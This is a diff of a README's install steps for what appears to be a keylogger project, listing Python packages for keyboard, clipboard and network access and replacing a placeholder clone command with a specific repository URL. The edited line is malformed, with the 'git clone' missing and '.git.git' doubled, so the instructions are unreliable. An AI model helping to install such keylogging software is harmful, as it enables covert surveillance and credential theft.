@@ -39,8 +39,8 @@ pip install pynput pyautogui pyperclip psutil cryptography requests pywin32
 
 1. **Clone the Repo**:
    ```bash
-   git clone https://github.com/your-username/your-repository-name.git
-   cd your-repository-name
+   https://github.com/renatochuck/keylogger.git.git
+   cd /keylogger
    ```
 
 2. **Install Dependencies**:
